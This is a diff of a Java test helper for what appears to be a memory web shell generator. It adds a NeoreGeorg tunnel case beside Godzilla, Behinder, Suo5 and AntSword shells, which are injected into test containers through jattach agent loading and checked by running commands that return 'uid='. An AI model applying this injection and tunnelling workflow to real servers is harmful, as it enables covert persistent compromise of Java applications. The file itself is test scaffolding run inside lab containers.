@@ -15,7 +15,6 @@ import okhttp3.Request;
 import okhttp3.Response;
 import org.java_websocket.client.WebSocketClient;
 import org.java_websocket.handshake.ServerHandshake;
-import org.junit.jupiter.api.Test;
 import org.testcontainers.containers.GenericContainer;
 import org.testcontainers.shaded.org.apache.commons.io.FileUtils;
 import org.testcontainers.shaded.org.apache.commons.lang3.RandomStringUtils;
@@ -49,6 +48,11 @@ public class ShellAssertionTool {
 
     @SneakyThrows
     public static void testShellInjectAssertOk(String url, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packers packer, GenericContainer<?> container) {
+        testShellInjectAssertOk(url, server, shellType, shellTool, targetJdkVersion, packer, container, null);
+    }
+
+    @SneakyThrows
+    public static void testShellInjectAssertOk(String url, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packers packer, GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
         String shellUrl = url + "/test";
 
         String urlPattern = null;
@@ -75,12 +79,12 @@ public class ShellAssertionTool {
             Path tempJar = Files.createTempFile("temp", "jar");
             Files.write(tempJar, bytes);
             String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
-            container.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
+            appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
 //            Files.copy(tempJar, Paths.get("target.jar"));
             FileUtils.deleteQuietly(tempJar.toFile());
-            String pidInContainer = container.execInContainer("bash", "/fetch_pid.sh").getStdout();
+            String pidInContainer = appContainer.execInContainer("bash", "/fetch_pid.sh").getStdout();
             assertDoesNotThrow(() -> Long.parseLong(pidInContainer));
-            String stdout = container.execInContainer("/jattach", pidInContainer, "load", "instrument", "false", jarPath).getStdout();
+            String stdout = appContainer.execInContainer("/jattach", pidInContainer, "load", "instrument", "false", jarPath).getStdout();
             log.info("attach result: {}", stdout);
             assertThat(stdout, anyOf(
                     containsString("ATTACH_ACK"),
@@ -88,7 +92,7 @@ public class ShellAssertionTool {
             ));
         } else {
             content = packer.getInstance().pack(generateResult);
-            assertInjectIsOk(url, shellType, shellTool, content, packer, container);
+            assertInjectIsOk(url, shellType, shellTool, content, packer, appContainer);
             log.info("send inject payload successfully");
         }
 
@@ -112,7 +116,18 @@ public class ShellAssertionTool {
             case AntSword:
                 testAntSwordIsOk(shellUrl, ((AntSwordConfig) generateResult.getShellToolConfig()));
                 break;
+            case NeoreGeorg:
+                testNeoreGeorgIsOk(appContainer, pythonContainer, shellUrl, ((NeoreGeorgConfig) generateResult.getShellToolConfig()));
+                break;
         }
+    }
+
+    private static void testNeoreGeorgIsOk(GenericContainer<?> container, GenericContainer<?> pythonContainer, String shellUrl, NeoreGeorgConfig shellToolConfig) throws Exception {
+        URL url = new URL(shellUrl);
+        shellUrl = "http://app:" + container.getExposedPorts().stream().findFirst().get() + url.getPath();
+        String stdout = pythonContainer.execInContainer("python", "/app/neoreg.py", "-k", "key", "-H", shellToolConfig.getHeaderName() + ": " + shellToolConfig.getHeaderValue(), "-u", shellUrl).getStdout();
+        log.info(stdout);
+        assertTrue(stdout.contains("All seems fine"));
     }
 
     public static void testGodzillaIsOk(String entrypoint, GodzillaConfig shellConfig) {
@@ -143,11 +158,6 @@ public class ShellAssertionTool {
             System.out.println(res.trim());
             assertTrue(res.contains("uid="));
         }
-    }
-
-    @Test
-    void name() throws Exception {
-        testWebSocketCommandIsOk("ws://localhost:8082/app/hello", null);
     }
 
     public static void testWebSocketCommandIsOk(String entrypoint, CommandConfig shellConfig) throws Exception {
@@ -185,7 +195,6 @@ public class ShellAssertionTool {
         }
 
         String res = responseHolder[0];
-        System.out.println(res);
         assertTrue(res.contains("uid="));
     }
 
@@ -235,7 +244,7 @@ public class ShellAssertionTool {
                         .pass(godzillaPass).key(godzillaKey)
                         .headerName("User-Agent").headerValue(uniqueName)
                         .build();
-                log.info("generated {} godzilla with pass: {}, key: {}, headerValue: {}", shellType, godzillaPass, godzillaKey, uniqueName);
+                log.info("generated {} godzilla with pass: {}, key: {}, User-Agent: {}", shellType, godzillaPass, godzillaKey, uniqueName);
                 break;
             case Command:
                 shellToolConfig = CommandConfig.builder()
@@ -250,14 +259,14 @@ public class ShellAssertionTool {
                         .headerName("User-Agent")
                         .headerValue(uniqueName)
                         .build();
-                log.info("generated {} behinder with pass: {}, headerValue: {}", shellType, behinderPass, uniqueName);
+                log.info("generated {} behinder with pass: {}, User-Agent: {}", shellType, behinderPass, uniqueName);
                 break;
             case Suo5:
                 shellToolConfig = Suo5Config.builder()
                         .headerName("User-Agent")
                         .headerValue(uniqueName)
                         .build();
-                log.info("generated {} suo5 with headerValue: {}", shellType, uniqueName);
+                log.info("generated {} suo5 with User-Agent: {}", shellType, uniqueName);
                 break;
             case AntSword:
                 String antPassword = "ant";
@@ -266,7 +275,14 @@ public class ShellAssertionTool {
                         .headerName("User-Agent")
                         .headerValue(uniqueName)
                         .build();
-                log.info("generated {} antSword with pass: {}, headerValue: {}", shellType, antPassword, uniqueName);
+                log.info("generated {} antSword with pass: {}, User-Agent: {}", shellType, antPassword, uniqueName);
+                break;
+            case NeoreGeorg:
+                shellToolConfig = NeoreGeorgConfig.builder()
+                        .headerName("Referer")
+                        .headerValue(uniqueName)
+                        .build();
+                log.info("generated {} NeoreGeorg with Referer: {}", shellType, uniqueName);
                 break;
         }
         return MemShellGenerator.generate(shellConfig, injectorConfig, shellToolConfig);
